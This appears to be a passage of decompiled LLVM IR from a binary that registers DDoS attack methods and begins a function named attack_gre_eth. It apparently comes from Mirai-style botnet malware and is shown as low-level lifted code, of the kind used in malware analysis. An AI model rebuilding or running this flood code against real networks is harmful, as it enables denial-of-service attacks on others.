  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_bd94.41 to i32))
  %v2_86ac = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_c1cc.43 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_223f4.32, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_c1cc.43 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_c1cc.43 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_b608.45 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_223f4.32, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_b608.45 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_b608.45 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_af5c.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_223f4.32, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_af5c.47 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_af5c.47 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_a864.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_223f4.32, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_a864.49 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_a864.49 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_a0b0.51 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_223f4.32, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_a0b0.51 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_a0b0.51 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 39164, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_223f4.32, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 39164, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 39164, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9040.54 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_223f4.32, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9040.54 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9040.54 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_89ac.56 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_223f4.32, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.56 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_89ac.56 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 ptrtoint (i32* @global_var_965c.58 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_223f4.32, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 ptrtoint (i32* @global_var_965c.58 to i32), i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 ptrtoint (i32* @global_var_965c.58 to i32), i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_223f0.30 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_223f1.39 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_223f0.30, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_223f0.30 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_89ac = load i32, i32* @r4, align 4
  %v6_89ac = load i32, i32* @r5, align 4
  %v24_89ac = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_89cc = load i32, i32* @r5, align 4
  store i32 %v0_89cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_89dc = load i32, i32* @r4, align 4
  store i32 %v0_89dc, i32* %r0.global-to-local, align 4
  %v5_89e0 = inttoptr i32 %v0_89cc to i32*
  %v6_89e0 = call i32 @attack_get_opt_int(i32 %v0_89dc, i32* %v5_89e0, i32 2, i32 0, i32 %v2_89c8)
  %v1_89ec = urem i32 %v6_89e0, 256
  store i32 %v1_89ec, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_89f8 = load i32, i32* @r5, align 4
  store i32 %v0_89f8, i32* %r1.global-to-local, align 4
  %v0_89fc = load i32, i32* @r4, align 4
  store i32 %v0_89fc, i32* %r0.global-to-local, align 4
  %v5_8a00 = trunc i32 %v6_89e0 to i8
  %v7_8a04 = inttoptr i32 %v0_89f8 to i32*
  %v8_8a04 = call i32 @attack_get_opt_int(i32 %v0_89fc, i32* %v7_8a04, i32 3, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v6_89e0)
  %v0_8a08 = load i32, i32* @r5, align 4
